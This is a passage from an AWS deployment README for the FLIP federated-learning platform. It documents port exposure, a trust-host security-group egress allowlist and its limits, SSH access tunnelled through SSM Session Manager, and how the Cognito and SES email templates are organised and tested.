- Same Docker Compose stack, running on a local Ubuntu host
- No inbound port forwarding or firewall rules needed — all trust communication is outbound

### Port configuration

Ingress at the load balancers (not at any EC2 SG — both EC2 hosts are in private subnets with no inbound rules from the internet). The NLB is the only load balancer reachable directly from the internet; the ALB is internal and only reachable via the CloudFront VPC origin:

| Port | Load balancer | Status | Source allow-list | Purpose |
| ---- | ------------- | ------ | ----------------- | ------- |
| **22** | — | 🔴 **CLOSED everywhere** | n/a | SSH never exposed — remote access is via SSM Session Manager tunnel |
| **443** | ALB (internal) | 🟢 **OPEN to VPC origin only** | `CloudFront-VPCOrigins-Service-SG` | `/api/*` HTTPS traffic from CloudFront via the VPC origin ENI. Not reachable from the internet (ALB has no public IP). Default action returns 404. |
| **80** | ALB (internal) | 🟡 **DEFINED, UNREACHABLE** | (no ingress rule) | Legacy HTTP→HTTPS redirect listener. SG has no port-80 ingress and the ALB has no public IP anyway; CloudFront already redirects HTTP→HTTPS at the edge and dials the origin HTTPS-only. |
| **`FL_SERVER_PORT`** | NLB | 🟡 **CONDITIONAL** | NAT Gateway public IP + every IP in `local_trust_public_ips` (list) | TCP/gRPC pass-through to the `fl-server-net-1` Fargate task |

Ports referenced internally only (no internet-facing ingress; reached only from inside the VPC or from the load balancers):

- **8000** — `flip-api` ECS task port (ALB target group target port). Not exposed externally.
- **`FL_API_PORT`** — `fl-api-net-1` ECS task port. Cloud Map internal only; no LB and no external ingress.
- **5432** — RDS PostgreSQL. Reachable only from the Central Hub bastion SG and the `flip-api` ECS task SG.
- **Trust API** — no inbound port needed; trusts poll the hub outbound.

### Trust EC2 egress allowlist (GHSA-8465)

The trust EC2's security group (`module.trust_security_group` in `main.tf`) sets
`block_all_outbound = true` and an explicit `egress_rules` allowlist (`local.trust_egress_rules`) —
previously it had no outbound restriction at all (`0.0.0.0/0`, every protocol/port, including
DNS). Security groups can only match on CIDR, a peer security group, or an AWS-managed prefix
list — never a hostname — so most destinations can only be expressed as a port.

**Read the table below as a union, not as a set of per-destination controls.** A security group is
a union of its rules: traffic is allowed if *any* rule matches. Because every hostname-less
destination collapses onto `0.0.0.0/0:443`, the effective outbound policy is "**any destination on
TCP 80, 443 and `FL_SERVER_PORT`, plus DNS to the VPC resolver — and nothing else**". Deleting the
Hugging Face reason would not block Hugging Face, and the S3 prefix-list rule does not confine S3
egress to that prefix list. Those narrower rules record intent — what the port is open *for*, and
what would still have to work if the 443 floor were ever narrowed — and are shadowed by the floor
today. The real, headline-worthy gain is the **port/protocol surface** (down from every port and
every protocol to three TCP ports) plus **blocking third-party DNS resolvers**.

**One row per AWS rule.** An EC2 security-group rule is identified by (direction, protocol, port
range, destination); the description is a mutable annotation, not part of that key. Rules differing
only by description are the *same* rule to AWS, so the Terraform emits one rule per tuple and
enumerates the reasons in the last column. `egress_rules` carries a validation that fails the plan
if two rules ever resolve to the same tuple again — the apply error it prevents
(`InvalidPermission.Duplicate`) picks its winner nondeterministically under Terraform's default
parallelism and never converges on re-runs.

| Rule (protocol/port → destination) | Scope | What it carries, and why |
|---|---|---|
| TCP 443 → `0.0.0.0/0` | any host | Central Hub API (CloudFront) for trust-api polling; GHCR image pulls (fl-client / trust-api / imaging-api / data-access-api / orthanc); Docker Hub (grafana / loki / alloy); Hugging Face mock OMOP/Orthanc seeding (`make seed-trust-data`, part of the standard `deploy-trust` chain); `download.docker.com` (Docker Engine install/upgrade, `geerlingguy.docker`); `awscli.amazonaws.com` (one-time AWS CLI v2 install); Ubuntu apt + `esm.ubuntu.com` over HTTPS; **PyPI and `download.pytorch.org`** (documented trust requirement in `admin-platform-support.rst`; also Flower's per-run `uv sync`); the **CloudWatch agent `.deb`** from `s3.amazonaws.com/amazoncloudwatch-agent/…` — us-east-1 S3, *outside* the regional prefix list, so it survives only on this floor; and the AWS APIs with no VPC endpoint provisioned (`ssmmessages`, `ec2messages`, `monitoring`). |
| TCP 80 → `0.0.0.0/0` | any host | Ubuntu apt mirrors over HTTP (package install/upgrade). |
| TCP 443 → S3 managed prefix list | `com.amazonaws.<region>.s3` | S3, for the AI Centre FL kit sync. A prefix list rather than a raw CIDR because S3's edge IPs rotate. Shadowed by the 443 floor — intent, not enforcement. |
| TCP 443 → `aws_security_group.vpc_endpoints` | peer SG | SSM control plane (`ssm`) and CloudWatch Logs (`logs`) via the VPC interface endpoints — one rule, since both share an endpoint SG and port. Shadowed by the 443 floor — intent, not enforcement. Gated on `var.enable_ecs_endpoints` (default `true`); when it is `false` the endpoints do not exist and this rule is omitted entirely rather than restated as a public rule, which would collide with the floor on the same tuple. |
| TCP `FL_SERVER_PORT` → `0.0.0.0/0` | any host | FL training traffic to the FL-server NLB. **The one destination the 443 floor does not cover**, and therefore the one that cannot be scoped to a peer SG: the NLB is internet-facing (public subnets, no `internal = true`), so its DNS resolves to public IPs even from inside the VPC, and the trust EC2 (private subnet, no public IP) reaches it out through the NAT gateway — which is precisely what the NLB's own ingress rule allowlisting the NAT public IP attests. A peer-SG destination matches only the private IPs of ENIs carrying that SG, so it would match none of this traffic and silently drop every FL connection while image pulls, hub polling and SSM all stayed healthy. Narrowable only once the NLB itself becomes `internal`, or by giving it static per-AZ EIPs via `subnet_mapping` and allowlisting those `/32`s. |
| TCP + UDP 53 → `cidrhost(var.vpc_cidr, 2)/32` | VPC resolver | Name resolution. **Inert as a control**: AWS documents that security groups cannot filter traffic to the Route 53 Resolver (the VPC+2 address / AmazonProvidedDNS), so these two rules neither permit nor restrict resolution — do not debug a DNS fault against them, and do not "fix" one by widening them. The control that actually satisfies #876's DNS criterion is the **absence** of a `0.0.0.0/0:53` rule, which *does* block third-party resolvers such as `8.8.8.8`. |

**NTP is deliberately absent and needs no rule.** Time sync runs against the AMI's default
link-local Amazon Time Sync service (`169.254.169.123`), which security groups do not evaluate. If
anyone repoints chrony at a public NTP pool, the failure is silent clock drift surfacing weeks
later as TLS / SigV4 / SSM errors — not as a firewall error.

The `0.0.0.0/0`-scoped rules are the practical floor for a security-group-only design and are
accepted as a permanent, documented limitation rather than a gap slated for a follow-up — closing
them for real would mean a domain-aware layer (AWS Network Firewall domain rules, or a forward
proxy), which is out of scope here. Even so, this is materially tighter than the previous
allow-all-protocols-all-ports default.

**Egress is managed inline; ingress by standalone rules.** `modules/secgroup` renders the allowlist
into the `aws_security_group` resource's inline `egress` attribute and attaches no
`aws_security_group_rule` of type `egress`. The asymmetry with ingress is deliberate and must not
be "tidied away": inline `ingress`/`egress` are attributes-as-blocks, so an explicit value —
including `[]` — is authoritative rather than unmanaged, and mixing it with standalone rule
resources on the same group is the combination the AWS provider documents as causing "rule
conflicts, perpetual differences, and rules being overwritten". In practice the plan immediately
after such an apply revokes the entire allowlist, SSM access included, and never converges.
Ingress keeps the opposite mechanism (standalone rules, the inline attribute never set), which is
what lets externally attached rules — such as the CloudFront VPC-origin rule in `cloudfront.tf` —
coexist safely.

### Remote Access via SSM Session Manager

EC2 instances are accessed through AWS Systems Manager Session Manager — port 22 is **not** open in any security group. SSH traffic is tunnelled through the SSM agent running on each instance, so no bastion host or inbound firewall rule is needed.

**Prerequisites**

- AWS CLI authenticated for the correct account and region:

  ```bash
  export AWS_PROFILE=<your-profile>   # e.g. stag or prod
  export AWS_REGION=eu-west-2         # must match the region where instances are deployed
  aws sso login --profile $AWS_PROFILE
  ```

- [AWS Session Manager plugin](https://docs.aws.amazon.com/systems-manager/latest/userguide/session-manager-working-with-install-plugin.html) installed (minimum version 1.2.319.0):

  **macOS:**

  ```bash
  brew install session-manager-plugin
  brew upgrade session-manager-plugin  # Update if already installed
  ```

  **Linux (Ubuntu/Debian):**

  ```bash
  curl "https://s3.amazonaws.com/session-manager-downloads/plugin/latest/ubuntu_64bit/session-manager-plugin.deb" -o "session-manager-plugin.deb"
  sudo dpkg -i session-manager-plugin.deb
  ```

  **Verify installation:**

  ```bash
  session-manager-plugin --version  # Should output version >= 1.2.319.0
  ```

- SSH key at `~/.ssh/host-aws` (configured in Step 3 of [Pre-configurations README](../README.md#step-3-get-ssh-key-configured))

**Updating `~/.ssh/config`**

After `terraform apply`, run:

```bash
make ssh-config
```

This calls `update_ssm_ssh_config.py`, which reads the EC2 instance IDs from Terraform outputs and writes `Host flip` / `Host flip-trust` blocks like the following into `~/.ssh/config`:

```text
# Managed by FLIP - SSH over SSM Session Manager
Host flip
    HostName i-0123456789abcdef0
    User ubuntu
    IdentitiesOnly yes
    IdentityFile ~/.ssh/host-aws
    StrictHostKeyChecking accept-new
    ProxyCommand aws ssm start-session --target %h --document-name AWS-StartSSHSession --parameters 'portNumber=%p' --region eu-west-2 --profile <your-profile>
    ControlMaster auto
    ControlPath ~/.ssh/cm-flip-%r@%h:%p
    ControlPersist 10m
```

**Connecting**

```bash
ssh flip        # Central Hub SSM bastion
ssh flip-trust  # Trust EC2
```

Both aliases resolve through the SSM tunnel — no public IP or open port 22 is needed. If your AWS session has expired, re-run `aws sso login --profile $AWS_PROFILE` before connecting.

**Troubleshooting SSM Access**

| Problem | Diagnostics | Solution |
| --------- | ------------- | ---------- |
| `Unable to locate credentials` | `aws sts get-caller-identity` returns error | Run `aws sso login --profile $AWS_PROFILE` to refresh session |
| `SessionManagerPlugin not found` | `command -v session-manager-plugin` returns nothing | Install plugin: `brew install session-manager-plugin` (macOS) or see prerequisites above |
| `[ERROR] SessionManagerPlugin is not installed` | Session manager plugin is missing or outdated | Upgrade plugin: `brew upgrade session-manager-plugin` or download latest version |
| `InvalidInstanceID.NotFound` | SSH attempts to connect but fails | Verify instance exists: `terraform output Ec2InstanceId` and `terraform output TrustEc2InstanceId` |
| `AccessDeniedException` | `aws ssm start-session` returns access denied | Check EC2 instance IAM role has `ssm:StartSession` and `ec2messages:*` permissions (Terraform should have created this) |
| `Connection timeout` (hanging) | SSM tunnel hangs without error | Check `aws ssm describe-instance-information` reports the instance as `Online`, verify the instance is running, and confirm its private subnet has NAT/VPC-endpoint egress. No inbound SSH rule is required. |
| `Unable to connect to SSM endpoint` | Connection fails immediately | Verify AWS_REGION matches deployment region: `echo $AWS_REGION` should match `eu-west-2` (or your region) |
| `Bad ProxyCommand` in ~/.ssh/config | SSH config syntax error | Re-generate config: `make ssh-config` and verify it looks like the example above |

**Testing Connectivity**

```bash
# Test SSM session directly (before trying SSH)
aws ssm start-session --target $(terraform output -raw Ec2InstanceId)

# Should open an interactive shell. Run `uname -a` to verify connectivity, then `exit`.

# Then test SSH
ssh flip  # Should connect via SSM tunnel
```

---

## Email Templates

All email templates are stored as standalone HTML files under `templates/`, organised by service. Both Terraform and the Python test utility load from the same files, ensuring a single source of truth.

### Template Structure

```sh
deploy/providers/AWS/
├── templates/
│   ├── cognito/
│   │   ├── invite.html                      # Temporary password invitation
│   │   ├── password_reset_code.html         # Password reset with verification code
│   │   └── password_reset_link.html         # Password reset with direct link
│   └── ses/
│       ├── flip-access-request.html         # Access request notification
│       ├── flip-access-request.txt          # Plain-text fallback
│       ├── flip-xnat-credentials.html       # XNAT credential notification
│       └── flip-xnat-credentials.txt        # Plain-text fallback
├── services.tf                              # Cognito config - loads cognito/ templates via file()
├── main.tf                                  # SES config - loads ses/ templates via file()
└── tests/
    └── test_email_templates.py              # Test utility for all templates
```

### How Templates Are Loaded

**Cognito templates** (services.tf):

```hcl
email_message = file("${path.module}/templates/cognito/invite.html")
```

**SES templates** (main.tf):

```hcl
html = file("${path.module}/templates/ses/flip-access-request.html")
text = file("${path.module}/templates/ses/flip-access-request.txt")
```

Changes to template files are automatically picked up on next `terraform apply` or test run.

### Template Placeholders

**Cognito templates** use single-brace placeholders substituted by AWS Cognito:

| Placeholder | Replaced By | Example |
| --- | --- | --- |
| `{username}` | Cognito username (email) | <john.smith@example.com> |
| `{####}` | 6-digit temporary password or verification code | 123456 |
| `{flip_alb_subdomain}` | ALB domain from Terraform var | flip-app.example.com |
| `{reset_link}` | Password reset link with token | <https://flip.../reset?token=xyz> |

**SES templates** use double-brace (Mustache) placeholders substituted at send time:

| Placeholder | Replaced By | Used In |
| --- | --- | --- |
| `{{name}}` | Requestor's name | access-request |
| `{{email}}` | Requestor's email | access-request |
| `{{purpose}}` | Access request purpose | access-request |
| `{{trust_name}}` | Trust name | xnat-credentials |
| `{{project_name}}` | XNAT project name | xnat-credentials |
| `{{project_id}}` | XNAT project ID | xnat-credentials |
| `{{username}}` | XNAT username | xnat-credentials |
| `{{password}}` | XNAT password | xnat-credentials |

### Quick Local Testing

```bash
cd deploy/providers/AWS

# Test all templates and generate HTML previews
python3 tests/test_email_templates.py

# View in browser with local HTTP server
python3 tests/test_email_templates.py --serve
# Open http://localhost:8000/flip_email_invite.html

# Test with custom data
python3 tests/test_email_templates.py \
  --username "user@health.org" \
  --subdomain "flip-stag.example.com"
```

The validation script checks:

- HTML structure and syntax
- Placeholder substitution for both Cognito and SES templates
- FLIP branding colors (#61366e, #9452A8)
- Required text elements present
- Generates browser-viewable preview files

### Testing Emails End-to-End

After deploying, test that emails are delivered correctly by using the **Register User** workflow in FLIP. Registering a new user through the platform triggers the Cognito invitation email with the temporary password. This is the simplest way to verify the templates render correctly in a real email client.

### Email Client Compatibility

| Client | Support | Notes |
| -------- | --------- | ------- |
| Gmail Web | Full | CSS gradients supported |
| Outlook Web | Full | CSS gradients with fallback |
| Apple Mail | Full | Dark mode compatible |
| Outlook Desktop | Mostly | Table layout reliable |
| Thunderbird | Full | Standard HTML support |
| Yahoo Mail | Good | Limited CSS support |

For professional cross-client testing: [Litmus](https://www.litmus.com/) or [Email on Acid](https://www.emailonacid.com/)

### SES Prerequisites

Before testing emails:

1. **Verify SES Email** in AWS Console (SES → Configuration → Identities)
2. **Sandbox Mode** (default): can only send to verified email addresses. Request production access in SES console.
3. **Check Send Quota**: `aws ses get-account-sending-enabled --region <aws-region>`

### Troubleshooting Email Issues

| Issue | Solution |
| ------- | ---------- |
| Email gradients don't render | Most clients support gradients; solid color fallback in template |
| Button not clickable | Some clients disable links for security; check email client settings |
| Text wraps awkwardly | Tables use responsive max-width: 600px (standard) |
| Colors wrong in dark mode | Test in both light/dark modes; colors are contrast checked |
| Logo not loading | Verify the image URL is accessible (hosted on GitHub raw content) |
| Email not delivered | Check SES verification status and sandbox mode restrictions |

### Making Template Changes

1. **Edit template file** in `templates/cognito/` or `templates/ses/`
2. **Test locally**: `python3 tests/test_email_templates.py` (verify all 5 pass)
3. **Review**: Check generated `email_previews/*.html` files in browser
4. **Deploy**: Changes are picked up on next `terraform apply`
